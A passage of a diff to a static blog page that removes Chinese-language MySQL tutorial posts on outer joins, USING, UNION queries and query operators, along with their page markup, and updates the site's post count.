-<li>如果主表记录在从表中一条都没有匹配成功，那么也要保留该记录：从表对应的字段值都为NULL<h3 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h3>基本语法：<br>左连接：主表 left join 从表 on 连接条件；<br>右连接：从表 right join 主表 on 连接条件</li>
-</ol>
-<p>左连接对应的主表数据在左边；右连接对应的主表数据在右边</p>
-<h3 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h3><ol>
-<li>外连接中主表数据记录一定会保存：连接之后不会出现记录数少于主表（内连接可能）</li>
-<li>左连接和右连接可以互相转换（主表不变即可），但是数据对应的位置（表顺序）会改变<h3 id="应用-2"><a href="#应用-2" class="headerlink" title="应用"></a>应用</h3>非常常用的一种获取的数据方式：作为数据获取对应主表以及其他数据（关联）</li>
-</ol>
-<p><br></p>
-<h2 id="自然连接"><a href="#自然连接" class="headerlink" title="自然连接"></a>自然连接</h2><p><br></p>
-<h2 id="using关键字"><a href="#using关键字" class="headerlink" title="using关键字"></a>using关键字</h2><p>是在连接查询中用来代替对应的on关键字，进行条件匹配</p>
-<h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><ol>
-<li>在连接查询时，使用on的地方用using代替</li>
-<li>使用using的前提是对应的两张表连接的字段是同名（类似自然连接自动匹配）</li>
-<li>如果使用using关键字，那么对应的同名字段，最终在结果中只会保留一个</li>
-</ol>
-<h3 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h3><p>基本语法：表1 【inner，left，right】join 表2 using（同名字段列表）  //连接字段<br><img src="/2019/02/12/mysql20-连接查询/using.png" alt=""></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/02/07/mysql19-联合查询/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="lh">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/02/07/mysql19-联合查询/" class="post-title-link" itemprop="url">mysql19-联合查询</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-02-07 22:36:49" itemprop="dateCreated datePublished" datetime="2019-02-07T22:36:49+08:00">2019-02-07</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-02-08 21:30:04" itemprop="dateModified" datetime="2019-02-08T21:30:04+08:00">2019-02-08</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/mysql/" itemprop="url" rel="index"><span itemprop="name">mysql</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h1><h2 id="基本概念："><a href="#基本概念：" class="headerlink" title="基本概念："></a>基本概念：</h2><p>联合查询时可合并多个相似的选择查询的结果集。等同于将一个表追加到另一个表，从而实现将两个表的查询组合到一起，使用谓词为UNION或UNION ALL</p>
-<p>联合查询：将多个查询的结果合并到一起（纵向合并）：字段数不变，多个查询的记录数合并。</p>
-<p>应用场景</p>
-<ol>
-<li>将同一张表中不同的结果（需要对应多条查询语句来实现），合并到一起展示数据</li>
-<li>最常见：在数据量大的情况下，会对表进行分表操作，需要对每张表进行部分数据统计，使用联合查询来将数据存放到一起显示。</li>
-</ol>
-<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>基本语法：<br>select 语句<br>union 【union选项】<br>select 语句</p>
-<p>union选项：与select选项基本一样<br>distinct：去重，去掉完全重复的数据（默认的）<br><img src="/2019/02/07/mysql19-联合查询/1.png" alt=""><br>all：保存所有的结果<br><img src="/2019/02/07/mysql19-联合查询/2.png" alt=""></p>
-<p>注意细节：union理论上只要保证字段数一样，不需要每次拿到的数据对应的字段类型一致。永远只保留第一个select语句对应的字段名<br><img src="/2019/02/07/mysql19-联合查询/3.png" alt=""></p>
-<h2 id="order-by的使用"><a href="#order-by的使用" class="headerlink" title="order by的使用"></a>order by的使用</h2><p>1.<br>在联合查询中，如果要使用order by，那么对应的select语句必须使用括号括起来<br><img src="/2019/02/07/mysql19-联合查询/4.png" alt=""><br>正确的语法要加上括号<br><img src="/2019/02/07/mysql19-联合查询/5.png" alt=""><br>2.<br>order by在联合查询中若想要生效，必须配合使用limit：而limit 必须跟对应的限制数量（通常可以使用一个较大的值：大于对应表的记录数）<br><img src="/2019/02/07/mysql19-联合查询/6.png" alt=""></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/02/06/mysql18-高级操作之查询中的运算符/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="lh">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/02/06/mysql18-高级操作之查询中的运算符/" class="post-title-link" itemprop="url">mysql18-高级操作之查询中的运算符</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-02-06 20:37:52" itemprop="dateCreated datePublished" datetime="2019-02-06T20:37:52+08:00">2019-02-06</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-02-07 11:19:55" itemprop="dateModified" datetime="2019-02-07T11:19:55+08:00">2019-02-07</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/mysql/" itemprop="url" rel="index"><span itemprop="name">mysql</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="高级操作–查询中的运算符"><a href="#高级操作–查询中的运算符" class="headerlink" title="高级操作–查询中的运算符"></a>高级操作–查询中的运算符</h1><p>算术运算符</p>
-<pre><code>+ - * / %
-</code></pre><p>基本算术预算：通常不再条件中使用，而是用于结果运算（select字段中）<br><img src="/2019/02/06/mysql18-高级操作之查询中的运算符/1.png" alt=""></p>
-<h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h2><blockquote>
-<p>, &gt;=, &lt;, &lt;=, =, &lt;&gt;（不等于）<br>通常是用来在条件中进行限定结果<br>=：在mysql中，没有对应的==比较符号，就是用=进行相等判断<br>&lt;=&gt; ：相等比较<br><img src="/2019/02/06/mysql18-高级操作之查询中的运算符/2.png" alt=""></p>
-</blockquote>
-<p>特殊应用:就是在字段结果中进行比较运算<br>注：mysql中没有规定select必须有数据表<br><img src="/2019/02/06/mysql18-高级操作之查询中的运算符/3.png" alt=""></p>
-<p>在条件判断的时候，还会有对应的比较运算符：计算区间<br>between 条件1 and 条件2<br><img src="/2019/02/06/mysql18-高级操作之查询中的运算符/4.png" alt=""></p>
-<p>between中条件1必须小于条件2，反过来不可以<br><img src="/2019/02/06/mysql18-高级操作之查询中的运算符/5.png" alt=""></p>
-<p>逻辑运算符</p>
-<p>and、or、not<br>and：逻辑与<br><img src="/2019/02/06/mysql18-高级操作之查询中的运算符/6.png" alt=""></p>
-<p>or：逻辑或<br><img src="/2019/02/06/mysql18-高级操作之查询中的运算符/7.png" alt=""><br> <br></p>
-<p>not：逻辑非</p>
-<h2 id="in预算符"><a href="#in预算符" class="headerlink" title="in预算符"></a>in预算符</h2><p>in：在什么里面，是用来代替=，当结果不是一个值，而是一个结果集的时候<br>基本语法： in（结果1，结果2，。。。）只要当前条件在结果集中出现过 ，就成立<br><img src="/2019/02/06/mysql18-高级操作之查询中的运算符/in.png" alt=""></p>
-<h2 id="is运算符"><a href="#is运算符" class="headerlink" title="is运算符"></a>is运算符</h2><p>is是专门用来判断字段是否为NULL的运算符<br>基本语法：is null/is not null<br><img src="/2019/02/06/mysql18-高级操作之查询中的运算符/is.png" alt=""></p>
-<h2 id="like运算符"><a href="#like运算符" class="headerlink" title="like运算符"></a>like运算符</h2><p>like运算符：是用来进行模糊匹配的（匹配字符串）<br>基本语法：like‘匹配模式’</p>
-<p>匹配模式中，有两种占位符<br>_：匹配对应的单个字符<br>%:匹配多个字符<br><img src="/2019/02/06/mysql18-高级操作之查询中的运算符/like.png" alt=""></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2509,7 +2581,7 @@ preg_split -- 用正则表达式分割字符串
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">61</span>
+                    <span class="site-state-item-count">65</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
